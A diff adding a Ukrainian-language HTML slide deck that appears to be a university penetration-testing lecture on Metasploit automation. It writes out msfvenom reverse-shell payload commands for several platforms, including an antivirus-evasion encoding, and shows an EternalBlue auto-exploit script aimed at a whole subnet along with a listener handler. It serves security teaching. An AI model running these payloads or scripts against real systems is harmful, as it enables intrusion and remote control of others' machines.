@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Тема 5.8 — Автоматизація та інтеграція</title>
+  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/slides.css">
+</head>
+<body data-lecture="5">
+  <div class="slide-deck">
+
+    <!-- Slide 1: Title -->
+    <section class="slide active title-slide">
+      <h1>Автоматизація та інтеграція</h1>
+      <div class="subtitle">Тема 5.8 — Фреймворк Metasploit та експлуатація</div>
+      <p>Кафедра ТЕІБ, Ужгородський національний університет</p>
+    </section>
+
+    <!-- Slide 2: msfvenom -->
+    <section class="slide">
+      <h2>msfvenom — генерація пейлоадів</h2>
+
+      <div class="info-box">
+        <strong>msfvenom = msfpayload + msfencode</strong> — уніфікований інструмент з MSF 5. Генерує standalone пейлоади для будь-якої платформи з кодуванням для обходу AV.
+      </div>
+
+      <div class="code-block">
+<span class="code-comment"># Windows reverse shell EXE</span>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe
+
+<span class="code-comment"># Linux ELF</span>
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf
+
+<span class="code-comment"># PHP web shell</span>
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php
+
+<span class="code-comment"># Android APK</span>
+msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -o app.apk
+
+<span class="code-comment"># З кодуванням (обхід AV)</span>
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=10.0.0.1 LPORT=4444 -f exe -o encoded.exe
+      </div>
+
+      <table class="comparison-table">
+        <thead>
+          <tr>
+            <th>Формат</th>
+            <th>Платформа</th>
+            <th>Формат</th>
+            <th>Платформа</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong>exe</strong></td>
+            <td class="cell-blue">Windows</td>
+            <td><strong>elf</strong></td>
+            <td class="cell-blue">Linux</td>
+          </tr>
+          <tr>
+            <td><strong>apk</strong></td>
+            <td class="cell-green">Android</td>
+            <td><strong>war</strong></td>
+            <td class="cell-green">Java (Tomcat)</td>
+          </tr>
+          <tr>
+            <td><strong>raw</strong></td>
+            <td class="cell-yellow">Сирі байти</td>
+            <td><strong>python</strong></td>
+            <td class="cell-yellow">Python скрипт</td>
+          </tr>
+          <tr>
+            <td><strong>powershell</strong></td>
+            <td class="cell-purple">PowerShell</td>
+            <td><strong>c</strong></td>
+            <td class="cell-purple">C shellcode</td>
+          </tr>
+          <tr>
+            <td><strong>vba</strong></td>
+            <td class="cell-red">Office макрос</td>
+            <td><strong>asp/aspx</strong></td>
+            <td class="cell-red">IIS Web</td>
+          </tr>
+        </tbody>
+      </table>
+    </section>
+
+    <!-- Slide 3: Resource Scripts -->
+    <section class="slide">
+      <h2>Resource Scripts — автоматизація</h2>
+
+      <div class="info-box">
+        <strong>.rc файли</strong> — скрипти з командами msfconsole для автоматизації рутинних задач (масове сканування, автоексплоїт, налаштування хендлерів).
+      </div>
+
+      <div class="code-block">
+<span class="code-comment"># auto_exploit.rc</span>
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.0/24
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 10.0.0.1
+run
+
+<span class="code-comment"># Запуск:</span>
+msfconsole -r auto_exploit.rc
+<span class="code-comment"># Або всередині msfconsole:</span>
+resource auto_exploit.rc
+
+<span class="code-comment"># Збереження виконаних команд у .rc файл:</span>
+makerc /tmp/session_commands.rc
+      </div>
+
+      <div class="two-column">
+        <div class="column">
+          <div class="card-green">
+            <h3>Приклад: Multi-handler</h3>
+            <div class="code-block">
+<span class="code-comment"># handler.rc</span>
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+exploit -j -z
+            </div>
+            <p>Запускає handler у фоні для прийому з'єднань</p>
+          </div>
+        </div>
+
+        <div class="column">
+          <div class="card-yellow">
+            <h3>Інші методи автоматизації</h3>
+            <ul>
+              <li><strong>AutoPwn</strong> — застарілий модуль (db_autopwn), видалений з MSF 5</li>
+              <li><strong>Альтернативи:</strong> Metasploit Pro (комерційний), custom Ruby скрипти, інтеграція з Python (pymetasploit3)</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 4: Інтеграція з іншими інструментами -->
+    <section class="slide">
+      <h2>Інтеграція з іншими інструментами</h2>
+
+      <div class="two-column">
+        <div class="column">
+          <div class="card-blue">
+            <h3>Nmap інтеграція</h3>
+            <div class="code-block">
+<span class="code-comment"># Скан з автоматичним імпортом у БД</span>
+db_nmap -sV -O 192.168.1.0/24
+
+<span class="code-comment"># Перегляд імпортованих даних</span>
+hosts
+services
+
+<span class="code-comment"># Пошук вразливих хостів</span>
+vulns -p 445 -S ms17
+
+<span class="code-comment"># Автоматичний вибір експлоїтів</span>
+db_autopwn -t -p -e  <span class="code-comment"># застарілий</span>
+            </div>
+            <p>Результати Nmap автоматично імпортуються в БД Metasploit. Можна відразу шукати вразливості за портом/сервісом.</p>
+          </div>
+        </div>
+
+        <div class="column">
+          <div class="card-green">
+            <h3>Інші інструменти</h3>
+            <ul>
+              <li><strong>Cobalt Strike</strong> — комерційний C2 фреймворк (team collaboration, beacon payloads, malleable profiles)</li>
+              <li><strong>Empire / Starkiller</strong> — PowerShell post-exploitation framework (Windows-орієнтований)</li>
+              <li><strong>Covenant</strong> — .NET C2 фреймворк (аналог Empire для .NET)</li>
+              <li><strong>Veil</strong> — AV evasion framework (генерація пейлоадів з обходом антивірусів)</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <div class="warning-box" style="margin-top: 1.5rem;">
+        <strong>Відповідальне використання!</strong> Інтеграція інструментів підвищує ефективність, але й збільшує потенційну шкоду. Використовуйте тільки в легальних сценаріях (pentest контракт, red team exercise, навчальні лабораторії).
+      </div>
+    </section>
+
+    <!-- Slide 5: Підсумок лекції 5 -->
+    <section class="slide">
+      <h2>Підсумок лекції 5</h2>
+
+      <div class="success-box">
+        Metasploit Framework — це не просто колекція експлоїтів. Це комплексна екосистема для всього циклу пентесту: від розвідки (db_nmap) до експлуатації та post-exploitation (Meterpreter).
+      </div>
+
+      <div class="two-column">
+        <div class="column">
+          <h3>Ключові теми лекції:</h3>
+          <div class="checklist">
+            <div class="checklist-item">Архітектура MSF: модулі, міксіни, REX, бібліотека експлоїтів</div>
+            <div class="checklist-item">Типи модулів: exploits, payloads, auxiliary, post, encoders, nops, evasion</div>
+            <div class="checklist-item">msfconsole: workspace, БД, пошук (search), використання модулів</div>
+            <div class="checklist-item">Експлоїти: single vs staged, bind vs reverse, exploit + payload</div>
+            <div class="checklist-item">Meterpreter: API, міграція, persistence, pivoting, post-модулі</div>
+            <div class="checklist-item">Evading AV: кодування, обфускація, polymorphic shellcode</div>
+            <div class="checklist-item">Pivoting: routes, autoroute, portfwd, socks proxy</div>
+            <div class="checklist-item">Автоматизація: msfvenom, .rc скрипти, інтеграція з Nmap</div>
+          </div>
+        </div>
+
+        <div class="column">
+          <div class="gradient-box gradient-purple">
+            <h3>Далі: Лекція 6 — Брутфорс та атаки на паролі</h3>
+            <p>Вивчимо атаки на аутентифікацію: словникові атаки, rainbow tables, онлайн vs офлайн брутфорс, Hydra, John the Ripper, Hashcat.</p>
+            <p><strong>Від експлуатації вразливостей — до зламу облікових записів!</strong></p>
+          </div>
+
+          <div class="info-box" style="margin-top: 1rem;">
+            <strong>Практика:</strong> налаштуйте власну лабораторію (Metasploitable 3, HackTheBox, VulnHub VMs) і пройдіть цикл: db_nmap → search → exploit → meterpreter → post → pivoting.
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </div>
+  <div class="slide-counter" id="counter"></div>
+  <div class="slide-progress" id="progress"></div>
+  <div class="controls">
+    <button id="btn-prev" onclick="prev()">&#8592;</button>
+    <button id="btn-next" onclick="next()">&#8594;</button>
+  </div>
+  <script src="../../js/slides.js"></script>
+</body>
+</html>
